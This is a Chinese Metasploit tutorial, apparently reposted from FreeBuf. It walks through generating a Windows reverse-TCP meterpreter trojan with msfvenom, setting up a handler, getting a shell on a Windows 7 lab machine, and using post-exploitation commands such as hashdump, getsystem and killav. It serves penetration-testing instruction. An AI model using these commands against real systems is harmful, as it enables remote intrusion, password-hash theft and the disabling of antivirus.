# 渗透工具：Metasploit教程-windows渗透

url：https://www.freebuf.com/articles/web/271173.html



## 0x00 简介

Metasploit Framework (MSF)是一款经典的渗透测试框架，之所以说是框架，是因为它是一款开源、可下载的框架并可以进行脚本自定义和二次开发。MSF是由Ruby程序语言编写的模板框架，具有很好的扩展性，便于渗透测试人员开发、使用和定制工具模板。我们能够通过它发现漏洞并进行快速实时攻击。

## 0x01 准备工作

1 由于kali已集成MSF，本次直接在kali2021.1版本上进行演示。

2 MSF使用PostgreSQL存储数据，启用该数据库将大幅提高搜索速度和效率

3 关闭防火墙避免不必要的干扰

### 1.1 配置PostgreSQ;数据库服务

开启kali

![v2-7d208fa98195e36840a7054b1531d98c_720w.jpg](images/1619480564_60874ff4d9d33c8722261.jpg!small)

打开终端

![v2-dac842b37c2e7dcf02577ca9eb5d38e9_720w.jpg](images/1619480565_60874ff592b340ec6c77e.jpg!small)

查看postgresql数据库服务状态

命令：systemctl status postgresql

![v2-72526f8de5cef143d0bdbe21f20240a7_1440w.jpg](images/1619480565_60874ff5f2cbaa56b84af.jpg!small)

开启服务：systemctl start postgresql

![v2-877837a03a574038a11e2d5e2942bb1f_1440w.jpg](images/1619480566_60874ff668ef899d93c50.jpg!small)

输入密码赋予sudo权限

![v2-98946aee9cfe1f764e4b32217d1b809d_1440w.jpg](images/1619480566_60874ff6b660add4d413e.jpg!small)

再次查看数据库状态啊

![v2-6779913727fc7ac44bd85b8674e6a010_1440w.jpg](images/1619480567_60874ff747d4099a9e8ed.jpg!small)

数据库服务成功启动

将数据库设置为开机自启，命令：sudo systemctl enable postgresql

![v2-66c866547700102eb8ebdf520bb1432c_1440w.jpg](images/1619480567_60874ff7b1f16a9bb59e9.jpg!small)

输入密码

![v2-63f15a778a18b1b8d0eec5385340c86a_1440w.jpg](images/1619480568_60874ff8207fbfbc38ad4.jpg!small)

成功将数据库服务设置为开机自启

### 1.2 建立MSF搜索索引

初始化Metasploit数据库，命令：sudo msfdb init

![v2-9a2c04684b4c73b4083f10b2d76b6ff3_1440w.jpg](images/1619480568_60874ff88e9285f2c4b04.jpg!small)

**注：由于刚刚我们已经进行了sudo的校验，所以在当前会话中将不再验证**

成功创建MSF搜索数据库

查看MSF和数据库的连接，命令：msfconsole db_status

![v2-4bcb2e967fe0bba878c4e0c4888eff7b_1440w.jpg](images/1619480569_60874ff900fc4aa47506c.jpg!small)

输入exit退出MSF

![v2-a5667bf8876ef15d9ee6bc3e76ab884d_1440w.jpg](images/1619480569_60874ff9595437f5f4b34.jpg!small)

建立数据库缓存，命令：msfconsole db_rebuild_cache

![v2-ecc946705e178969708fc219c841b8b5_1440w.jpg](images/1619480569_60874ff9b5fe0e65a8ac1.jpg!small)

![v2-8934a6a3e78c0ac0d0fd24478ab93116_1440w.jpg](images/1619480570_60874ffa1e408440a928a.jpg!small)

成功建立元数据索引

### 1.3 关闭防火墙

安装ufw：sudo apt-get install ufw

![v2-8272f99e0b9a54ea41f1d771b819b1ea_1440w.jpg](images/1619480570_60874ffa6dff018a1205d.jpg!small)

![v2-9d7aa302c7cfe975a6ace955a97209f9_1440w.jpg](images/1619480570_60874ffac683179dcd613.jpg!small)

关闭防火墙并禁止开机自启：sudo ufw disable

![v2-f05f9d39d1ff079a0e5a29132aae7195_1440w.jpg](images/1619480571_60874ffb285568c6e7e58.jpg!small)

## 0x02 MSFvenom

Msfvenom是MSF内置的木马生成器，支持windows、Linux平台和多种语言，但由于做的过好所以很快就被杀软直接消灭了(原生的基本都是百分百检测)，关于免杀的内容放到以后单独出一期。

### 2.1 参数说明

> -p payload
>
> -e 编码方式
>
> -I 编码次数
>
> -b 在生成的程序中避免出现的值
>
> LHOST,LPORT 监听主机的IP和端口
>
> -f exe 生成exe格式

可以执行msfvenom -l 查看payload列表

### 2.2 生成木马

输入ifconfig查看本机网卡信息

![v2-c7227b7adb86aaeb1bd729cb73c07fa0_1440w.jpg](images/1619480571_60874ffbb85ad31a5fd3f.jpg!small)

使用以太网卡eth0:10.1.1.24

查看本机端口占用情况

![v2-e372743420052baee3b92c54c6d22377_1440w.jpg](images/1619480572_60874ffc0e8f01485b15d.jpg!small)

**要时刻注意端口冲突问题**

终端输入msfconsole开启MSF

![v2-3c6d111cecd15e979e8647c8104140cf_1440w.jpg](images/1619480572_60874ffc628a1fe57af6c.jpg!small)![v2-99189749fd9fcd6a847111970cad9b15_1440w.jpg](images/1619480572_60874ffcbe8b6f4fa3200.jpg!small)

本次演示生成Windows木马，推荐使用大端口号

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.1.24 LPORT=23333 -f exe > msf.exe
```

![v2-600e48575c7274c4159366b87278b5c6_1440w.jpg](images/1619480573_60874ffd373b56b7de4d4.jpg!small)

成功生成木马

## 0x03 监听

### **3.1 介绍**

模块：exploit/multi/handler

参数说明：

set PAYLOAD <一定要和攻击payload相同>

set LHOST <监听IP>

set LPORT <监听端口>

set ExitOnSession false 设置是否自动断开会话

exploit / run：开启监听

show options：查看当前配置

### **3.2 开启监听**

打开msf，进入监听模块

use exploit/multi/handler

![v2-80a984faf1098fc4aa8a25d768df7242_1440w.jpg](images/1619480573_60874ffd90a77abb11644.jpg!small)

设置payload，以Windows为例

```
set payload windows/meterpreter/reverse_tcp
```

![v2-d5a5f77f260a3da4cf07d61ffe913079_1440w.jpg](images/1619480573_60874ffde912c1d33a614.jpg!small)

设置本机IP，set LHOST 你的IP

![v2-25b157b88d55fda274e888cdbb052f2a_1440w.jpg](images/1619480574_60874ffe447dd5de9c998.jpg!small)

设置监听端口，set LPORT 监听的端口

![v2-ed1479965fcef4e693fc5466f40eb6bc_1440w.jpg](images/1619480574_60874ffeb9bca230d294c.jpg!small)

查看配置

![v2-8a35710ae0baf749f515a2742888760a_1440w.jpg](images/1619480575_60874fff17b80984356e7.jpg!small)

开启监听

![v2-7284c817b0dfc33acb30c2c39a7a547a_1440w.jpg](images/1619480575_60874fff666cad6f98558.jpg!small)

### 3.3 反弹shell

受害机：Windows 7

将2.2中生成的木马msf.exe上传到win7中

![v2-ef3b6f793415bcf91c0d33d6134baac5_1440w.jpg](images/1619480575_60874fffc825cbf95ad15.jpg!small)

运行msf.exe，返回kali查看效果

![v2-3a90609e02c356758ed80c16c4b7baab_1440w.jpg](images/1619480576_6087500028f49dcafe412.jpg!small)

成功获取shell，此时可以进行下一步的攻击操作了

### **3.4 后渗透**

当我们的木马成功反弹目标机shell后，第一步就是获取目标机的一些基础信息，例如系统版本，网段，AD等…MSF已经为我们提供了一些便捷的功能

```
注：下列命令都是在meterpreter下运行
```

background：将会话放回后台

exit：关闭会话

help：查看帮助信息

sysinfo：查看系统信息

screenshot：截取屏幕

shell cmd：执行目标系统命令

download 目标机filename 本机filename’：下载文件到本机

upload 本地文件路径 目标文件路径：上传文件到目标机

getuid：查看用户权限

getsystem：尝试获取SYSTEM权限

hashdump：导出密码的hash值

run killav：关闭杀软

run getgui -e：启用远程桌面(需要目标系统支持)

**演示部分命令：**

![v2-97b69506d85442a336f6918d1b324184_1440w.jpg](images/1619480576_60875000b3ce5046d6af6.jpg!small)

![v2-4f9d917e903839f0bcb15b25e25594d3_1440w.jpg](images/1619480577_608750011377f40dcce97.jpg!small)

![v2-9fd49fa69dea9960bfe8a720b515a2cd_1440w.jpg](images/1619480577_608750015c2dace753baf.jpg!small)

挂起会话：background

![v2-78981d8b2a0fa8a4c0fc6d7d8841c9bd_1440w.jpg](images/1619480577_60875001aab9504fbca14.jpg!small)

查看会话列表：sessions

![v2-b21c1fbae4d5b75f4367a22b06087a57_1440w.jpg](images/1619480578_60875002129e6d0b8c574.jpg!small)

进入指定ID的会话：session -I ID

![v2-a2d6cc54ce16f9aaad15f0bab464c482_1440w.jpg](images/1619480578_608750027be5c112ff3b6.jpg!small)